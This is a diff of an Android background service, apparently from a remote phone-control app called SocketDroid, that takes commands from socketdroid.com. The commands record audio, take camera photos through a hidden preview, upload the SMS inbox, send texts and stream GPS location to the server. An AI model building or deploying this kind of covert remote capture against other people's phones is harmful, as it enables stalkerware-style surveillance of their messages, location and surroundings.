@@ -1,6 +1,8 @@
 package com.socketdroid.mastashake08.socketdroid;
 
 import android.Manifest;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -15,6 +17,7 @@ import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
+import android.media.AudioFormat;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.BatteryManager;
@@ -24,11 +27,15 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.SystemClock;
 import android.os.Vibrator;
 import android.preference.PreferenceActivity;
 import android.preference.PreferenceManager;
 import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
+import android.support.v4.app.NotificationCompat;
+import android.support.v4.app.TaskStackBuilder;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.SurfaceHolder;
@@ -48,6 +55,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -59,6 +67,7 @@ import java.net.URISyntaxException;
 import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.Timer;
 
 import cz.msebera.android.httpclient.Header;
 import io.socket.client.Ack;
@@ -76,12 +85,14 @@ import static android.provider.MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO;
 
 public class MyService extends Service {
     Socket socket;
-    MediaRecorder mRecorder;
+    MediaRecorder mRecorder = null;
     String mFileName;
     static Handler handler = null;
     LocationManager locationManager = null;
     LocationListener locationListener = null;
     File pictureFile;
+    private Thread recordingThread = null;
+    private boolean isRecording = false;
 
 
 
@@ -93,6 +104,36 @@ public class MyService extends Service {
         return null;
     }
 
+    private void showNotification(JSONObject obj) throws JSONException {
+        int mId = (int) Math.random() * 100 ;
+        NotificationCompat.Builder mBuilder =
+                new NotificationCompat.Builder(MyService.this.getApplicationContext())
+                        .setSmallIcon(R.drawable.notification)
+                        .setContentTitle(obj.getString("title"))
+                        .setContentText(obj.getString(("message")));
+// Creates an explicit intent for an Activity in your app
+        Intent resultIntent = new Intent(MyService.this.getApplicationContext(), MainActivity.class);
+
+// The stack builder object will contain an artificial back stack for the
+// started Activity.
+// This ensures that navigating backward from the Activity leads out of
+// your application to the Home screen.
+        TaskStackBuilder stackBuilder = TaskStackBuilder.create(MyService.this.getApplicationContext());
+// Adds the back stack for the Intent (but not the Intent itself)
+        stackBuilder.addParentStack(MainActivity.class);
+// Adds the Intent that starts the Activity to the top of the stack
+        stackBuilder.addNextIntent(resultIntent);
+        PendingIntent resultPendingIntent =
+                stackBuilder.getPendingIntent(
+                        0,
+                        PendingIntent.FLAG_UPDATE_CURRENT
+                );
+        mBuilder.setContentIntent(resultPendingIntent);
+        NotificationManager mNotificationManager =
+                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+// mId allows you to update the notification later on.
+        mNotificationManager.notify(mId, mBuilder.build());
+    }
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
 
@@ -115,7 +156,11 @@ public class MyService extends Service {
     }
 
     private void disconnectWebSocket() {
+        SharedPreferences prefs = getSharedPreferences("com.socketdroid.mastashake08.socketdroid",MODE_PRIVATE);
         socket.disconnect();
+        socket.off(prefs.getString("id",""));
+        socket.off("notification");
+        prefs.edit().putBoolean("service-running",false).commit();
     }
     private Camera.PictureCallback mPicture = new Camera.PictureCallback() {
 
@@ -190,139 +235,388 @@ public class MyService extends Service {
         Log.i("Websocket", "Connecting...");
         URI uri = new URI("https://socketdroid.com:6001");
         socket = IO.socket(uri);
-        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        final Intent batteryStatus = MyService.this.getApplicationContext().registerReceiver(null, ifilter);
+
         socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
 
             @Override
             public void call(Object... args) {
                 Log.i("Socket", "Connected!");
-                socket.emit("test", "Connection Successful");
+                prefs.edit().putBoolean("service-running",true).commit();
+
             }
 
-        }).on(prefs.getString("id",""), new Emitter.Listener() {
+        }).on("notification",new Emitter.Listener(){
 
             @Override
             public void call(Object... args) {
                 final JSONObject obj = (JSONObject) args[0];
+                try {
+                    showNotification(obj.getJSONObject("data"));
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+
+            }
+
+
+        }).on(prefs.getString("id",""), new Emitter.Listener() {
+            private void startGPS(LocationListener locationListener) {
+                Log.i("GPS", "Getting...");
+                // Acquire a reference to the system Location Manager
+                locationManager = (LocationManager) MyService.this.getSystemService(Context.LOCATION_SERVICE);
+
+                // Define a listener that responds to location updates
+                final LocationListener finalLocationListener = locationListener;
+                locationListener = new LocationListener() {
+                    public void onLocationChanged(final Location location) {
+                        // Called when a new location is found by the network location provider.
+                        handler = new Handler(Looper.getMainLooper());
+
+                        handler.post(new Runnable() {
+
+                            @Override
+                            public void run() {
+                                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, finalLocationListener);
+
+                                RequestParams params = new RequestParams();
+                                //"photos" is Name of the field to identify file on server
+                                params.put("lat", location.getLatitude());
+                                params.put("long", location.getLongitude());
+                                //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
+                                client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-gps", params, new AsyncHttpResponseHandler() {
+                                    @Override
+                                    public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
+                                        Log.i("HTTP", "Failed..");
+                                    }
+
+                                    @Override
+                                    public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
+                                        Log.i("HTTP", "Success..");
+                                    }
+                                });
+                            }
+                        });
+
+                    }
+
+                    public void onStatusChanged(String provider, int status, Bundle extras) {
+                    }
+
+                    public void onProviderEnabled(String provider) {
+                    }
+
+                    public void onProviderDisabled(String provider) {
+                    }
+                };
+
+                // Register the listener with the Location Manager to receive location updates
+
+                //
+
+                String locationProvider = LocationManager.GPS_PROVIDER;
+                // Or use LocationManager.GPS_PROVIDER
+
+
+                final Location lastKnownLocation = locationManager.getLastKnownLocation(locationProvider);
+
+
+                Log.i("GPS", "Latitude" + lastKnownLocation.getLatitude());
+                Log.i("GPS", "Longitude" + lastKnownLocation.getLongitude());
+                handler = new Handler(Looper.getMainLooper());
+
+                handler.post(new Runnable() {
+
+                    @Override
+                    public void run() {
+
+
+                        RequestParams params = new RequestParams();
+                        //"photos" is Name of the field to identify file on server
+                        params.put("lat", lastKnownLocation.getLatitude());
+                        params.put("long", lastKnownLocation.getLongitude());
+                        //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
+                        client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-gps", params, new AsyncHttpResponseHandler() {
+                            @Override
+                            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
+                                Log.i("HTTP", "Failed..");
+                            }
+
+                            @Override
+                            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
+                                Log.i("HTTP", "Success..");
+                            }
+                        });
+                    }
+                });
+            }
+
+
+
+
+
+
+            private void stopGPS(LocationListener locationListener) {
+                locationManager.removeUpdates(locationListener);
+            }
+
+            private void getSMS(final SharedPreferences prefs) {
+                handler = new Handler(Looper.getMainLooper());
+
+
+
+                handler.post(new Runnable() {
+
+                    @Override
+                    public void run(){
+                        JSONArray texts = getTexts();
+                        RequestParams params = new RequestParams();
+                        //"photos" is Name of the field to identify file on server
+                        params.put("texts",texts);
+                        params.put("phone",prefs.getString("id",""));
+                        //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
+                        client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-texts", params, new AsyncHttpResponseHandler() {
+                            @Override
+                            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
+                                Log.i("HTTP", "Failed..");
+                            }
+
+                            @Override
+                            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
+                                Log.i("HTTP", "Success..");
+                            }
+                        });
+
+                    }
+                });
+            }
+
+            private void sendSMS(JSONObject obj) {
+                Log.i("SMS", "Sending...");
+                String text = null;
+                try {
+                    text = obj.getJSONObject("data").getString("text");
+                    String phone = obj.getJSONObject("data").getString("phone");
+                    SmsManager smsManager = SmsManager.getDefault();
+                    smsManager.sendTextMessage(phone, null, text, null, null);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+
+
+            }
+
+            private void getBatteryLevel() {
+                IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+                Intent batteryStatus = MyService.this.getApplicationContext().registerReceiver(null, ifilter);
+                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+
+                final float batteryPct = level / (float)scale;
+                handler = new Handler(Looper.getMainLooper());
+
+                handler.post(new Runnable() {
+
+                    @Override
+                    public void run() {
+
+
+                        RequestParams params = new RequestParams();
+                        //"photos" is Name of the field to identify file on server
+                        params.put("battery",batteryPct);
+                        //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
+                        client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-battery", params, new AsyncHttpResponseHandler() {
+                            @Override
+                            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
+                                Log.i("HTTP", "Failed..");
+                            }
+
+                            @Override
+                            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
+                                Log.i("HTTP", "Success..");
+                            }
+                        });
+                    }
+                });
+
+            }
+
+            private void stopAudioRecording(MediaRecorder mRecorder, String mFilename, final SharedPreferences prefs) {
+                handler = new Handler(Looper.getMainLooper());
+                mRecorder.stop();
+                mRecorder.release();
+                mRecorder = null;
+                isRecording = false;
+                recordingThread = null;
+               // stopStreamingAudio(mFileName);
+
+                handler.post(new Runnable() {
+
+                    @Override
+                    public void run() {
+                        // Creates a Async client.
+
+
+                        //New File
+                        File files = new File(mFileName);
+                        RequestParams params = new RequestParams();
+                        try {
+                            //"photos" is Name of the field to identify file on server
+                            params.put("audio", files);
+                            params.put("phone",prefs.getString("id",""));
+                        } catch (FileNotFoundException e) {
+                            //TODO: Handle error
+                            e.printStackTrace();
+                        }
+                        //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
+                        client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/audio-upload", params, new AsyncHttpResponseHandler() {
+                            @Override
+                            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
+                                Log.i("HTTP", "Failed..");
+                                mFileName = "";
+                            }
+
+                            @Override
+                            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
+                                Log.i("HTTP", "Success..");
+                                mFileName = "";
+                            }
+                        });
+
+                    }
+                });
+
+            }
+
+            private void takePhoto() {
+
+                Log.i("Camera","Called");
+
+                Camera c = null;
+                try {
+                    c = Camera.open(1); // attempt to get a Camera instance
+                    c.setPreviewTexture(new SurfaceTexture(0));
+                    c.startPreview();
+                    c.takePicture(null, null, mPicture);
+                    Log.i("Camera","taken");
+
+                }
+                catch (Exception e){
+                    // Camera is not available (in use or does not exist)
+                }
+
+            }
+
+            private void vibrateDevice() {
+                // Get instance of Vibrator from current Context
+                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+
+                // Vibrate for 300 milliseconds
+                v.vibrate(500);
+            }
+
+            private void startAudioRecording(final String mFileName) {
+
+                    mRecorder = new MediaRecorder();
+
+
+
+                try {
+                    mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                    mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                    mRecorder.setOutputFile(mFileName);
+                    mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                    mRecorder.setAudioEncodingBitRate(AudioFormat.ENCODING_PCM_16BIT);
+
+                    mRecorder.prepare();
+
+                    isRecording = true;
+                    recordingThread = new Thread(new Runnable() {
+                        public void run() {
+                            mRecorder.start();
+                            //startStreamingAudio(mFileName);
+                        }
+                    }, "AudioRecorder Thread");
+
+                   
+                    recordingThread.start();
+                }  catch (IOException e) {
+                    Log.e("audio", "prepare() failed");
+                }
+
+
+            }
+
+            private void stopStreamingAudio(String mFileName) {
+
+            }
+
+            private void startStreamingAudio(String mFileName) {
+
+                SharedPreferences prefs = getSharedPreferences("com.socketdroid.mastashake08.socketdroid", MODE_PRIVATE);
+                int i = 0;
+
+                byte[] buffer = new byte[1024];
+
+                try {
+                    FileInputStream fis = new FileInputStream(mFileName);
+                    while(true) {
+
+                        int in = fis.read(buffer, 0, buffer.length);
+
+                        if(in != -1) {
+                            SystemClock.sleep(1000);
+                            JSONObject obj = new JSONObject();
+                            byte[] audio = new byte[42];
+
+                            Log.i("i",String.valueOf(i));
+                            Log.i("Audio Buffer", String.valueOf(buffer));
+                            Log.i("Audio Buffer", String.valueOf(audio));
+
+                            obj.put("audio",audio);
+                            obj.put("device-id",prefs.getString("id",""));
+                            Log.i("audio-bytes", obj.toString());
+                            socket.emit("audio", obj);
+
+                        }else{
+                            break;
+                        }
+                    }
+                }catch (Exception e) {
+                    Log.d("Exception", e.toString());
+                }
+            }
+
+
+            @Override
+            public void call(Object... args) {
+                final JSONObject obj = (JSONObject) args[0];
+                Log.i("JSON",obj.toString());
 
                 try {
                     switch (obj.getJSONObject("data").getString("command")) {
+                        case "push":
+                            showNotification(obj.getJSONObject("data"));
+                            break;
                         case "audio-start":
                             mFileName = Environment.getExternalStorageDirectory().getAbsolutePath();
                             Long tsLong = System.currentTimeMillis() / 1000;
                             mFileName += "/" + tsLong.toString() + ".3gp";
-                            mRecorder = new MediaRecorder();
-                            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-                            mRecorder.setOutputFile(mFileName);
-                            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-
-                            try {
-                                mRecorder.prepare();
-                                mRecorder.start();
-                            } catch (IOException e) {
-                                Log.e("audio", "prepare() failed");
-                            }
-
-
+                           startAudioRecording(mFileName);
 
 
                             break;
                         case "audio-stop":
-                            handler = new Handler(Looper.getMainLooper());
-                            mRecorder.stop();
-                            mRecorder.release();
-                            mRecorder = null;
-
-                            handler.post(new Runnable() {
-
-                                @Override
-                                public void run() {
-                                    // Creates a Async client.
-
-                                    //New File
-                                    File files = new File(mFileName);
-                                    RequestParams params = new RequestParams();
-                                    try {
-                                        //"photos" is Name of the field to identify file on server
-                                        params.put("audio", files);
-                                        params.put("phone",prefs.getString("id",""));
-                                    } catch (FileNotFoundException e) {
-                                        //TODO: Handle error
-                                        e.printStackTrace();
-                                    }
-                                    //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
-                                    client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/audio-upload", params, new AsyncHttpResponseHandler() {
-                                        @Override
-                                        public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                                            Log.i("HTTP", "Failed..");
-                                            mFileName = "";
-                                        }
-
-                                        @Override
-                                        public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                                            Log.i("HTTP", "Success..");
-                                            mFileName = "";
-                                        }
-                                    });
-
-                                }
-                            });
-
+                            stopAudioRecording(mRecorder,mFileName,prefs);
                             break;
                         case "camera":
-
-                            Log.i("Camera","Called");
-
-                            Camera c = null;
-                            try {
-                                c = Camera.open(1); // attempt to get a Camera instance
-                                c.setPreviewTexture(new SurfaceTexture(0));
-                                c.startPreview();
-                                c.takePicture(null, null, mPicture);
-                                Log.i("Camera","taken");
-
-                            }
-                            catch (Exception e){
-                                // Camera is not available (in use or does not exist)
-                            }
-
+                            takePhoto();
                             break;
                         case "battery":
 
-                            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-                            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-
-                            final float batteryPct = level / (float)scale;
-                            handler = new Handler(Looper.getMainLooper());
-
-                            handler.post(new Runnable() {
-
-                                @Override
-                                public void run() {
-
-
-                                    RequestParams params = new RequestParams();
-                                    //"photos" is Name of the field to identify file on server
-                                    params.put("battery",batteryPct);
-                                    //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
-                                    client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-battery", params, new AsyncHttpResponseHandler() {
-                                        @Override
-                                        public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                                            Log.i("HTTP", "Failed..");
-                                        }
-
-                                        @Override
-                                        public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                                            Log.i("HTTP", "Success..");
-                                        }
-                                    });
-                                }
-                            });
-
+                            getBatteryLevel();
                             break;
                         case "vibrate":
+                            //vibrateDevice();
                             // Get instance of Vibrator from current Context
                             Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
 
@@ -330,141 +624,19 @@ public class MyService extends Service {
                             v.vibrate(500);
                             break;
 
-                        case "toast":
-                            handler = new Handler(Looper.getMainLooper());
-                            emit("android response", "Toast Receieved");
-
-                            Log.i("Toast Event:", "Response submitted!");
-
-
-                            handler.post(new Runnable() {
-
-                                @Override
-                                public void run() {
-                                    Toast.makeText(getApplicationContext(), "Toast", Toast.LENGTH_SHORT).show();
-                                }
-                            });
+                        case "sms-send":
+                            sendSMS(obj);
                             break;
                         case "sms":
-                            handler = new Handler(Looper.getMainLooper());
-
-
-
-                            handler.post(new Runnable() {
-
-                                @Override
-                                public void run(){
-                                    JSONArray texts = getTexts();
-                                    RequestParams params = new RequestParams();
-                                    //"photos" is Name of the field to identify file on server
-                                    params.put("texts",texts);
-                                    params.put("phone",prefs.getString("id",""));
-                                    //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
-                                    client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-texts", params, new AsyncHttpResponseHandler() {
-                                        @Override
-                                        public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                                            Log.i("HTTP", "Failed..");
-                                        }
-
-                                        @Override
-                                        public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                                            Log.i("HTTP", "Success..");
-                                        }
-                                    });
-
-                                }
-                            });
+                           getSMS(prefs);
                             break;
                         case "stop-gps":
-                            locationManager.removeUpdates(locationListener);
+                            stopGPS(locationListener);
                             break;
                         case "gps":
-                            Log.i("GPS", "Getting...");
-                            // Acquire a reference to the system Location Manager
-                            locationManager = (LocationManager) MyService.this.getSystemService(Context.LOCATION_SERVICE);
+                           startGPS(locationListener);
+                            break;
 
-    // Define a listener that responds to location updates
-                            locationListener = new LocationListener() {
-                                public void onLocationChanged(final Location location) {
-                                    // Called when a new location is found by the network location provider.
-                                    handler = new Handler(Looper.getMainLooper());
-
-                                    handler.post(new Runnable() {
-
-                                        @Override
-                                        public void run() {
-                                            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
-
-                                            RequestParams params = new RequestParams();
-                                            //"photos" is Name of the field to identify file on server
-                                            params.put("lat", location.getLatitude());
-                                            params.put("long", location.getLongitude());
-                                            //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
-                                            client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-gps", params, new AsyncHttpResponseHandler() {
-                                                @Override
-                                                public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                                                    Log.i("HTTP", "Failed..");
-                                                }
-
-                                                @Override
-                                                public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                                                    Log.i("HTTP", "Success..");
-                                                }
-                                            });
-                                        }
-                                    });
-
-                                }
-
-                                public void onStatusChanged(String provider, int status, Bundle extras) {
-                                }
-
-                                public void onProviderEnabled(String provider) {
-                                }
-
-                                public void onProviderDisabled(String provider) {
-                                }
-                            };
-
-    // Register the listener with the Location Manager to receive location updates
-
-                            //
-
-                            String locationProvider = LocationManager.GPS_PROVIDER;
-    // Or use LocationManager.GPS_PROVIDER
-
-
-                            final Location lastKnownLocation = locationManager.getLastKnownLocation(locationProvider);
-
-
-                            Log.i("GPS", "Latitude" + lastKnownLocation.getLatitude());
-                            Log.i("GPS", "Longitude" + lastKnownLocation.getLongitude());
-                            handler = new Handler(Looper.getMainLooper());
-
-                            handler.post(new Runnable() {
-
-                                @Override
-                                public void run() {
-
-
-                                    RequestParams params = new RequestParams();
-                                    //"photos" is Name of the field to identify file on server
-                                    params.put("lat", lastKnownLocation.getLatitude());
-                                    params.put("long", lastKnownLocation.getLongitude());
-                                    //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
-                                    client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-gps", params, new AsyncHttpResponseHandler() {
-                                        @Override
-                                        public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                                            Log.i("HTTP", "Failed..");
-                                        }
-
-                                        @Override
-                                        public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                                            Log.i("HTTP", "Success..");
-                                        }
-                                    });
-                                }
-                            });
                     }
                 } catch (JSONException e) {
                     e.printStackTrace();
@@ -481,25 +653,11 @@ public class MyService extends Service {
 
         });
         socket.connect();
+
     }
 
     private void emit(String topic, String message) {
         socket.emit(topic, message);
-        URL url = null;
-        try {
-            url = new URL("https://socketdroid.com/response");
-            Log.i("url",url.toString());
-            HttpURLConnection conn = null;
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setReadTimeout(10000 /* milliseconds */);
-            conn.setConnectTimeout(15000 /* milliseconds */);
-            conn.setRequestMethod("GET");
-            conn.setDoInput(true);
-            // Starts the query
-            conn.connect();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
     }
     public void sendFile() {
 
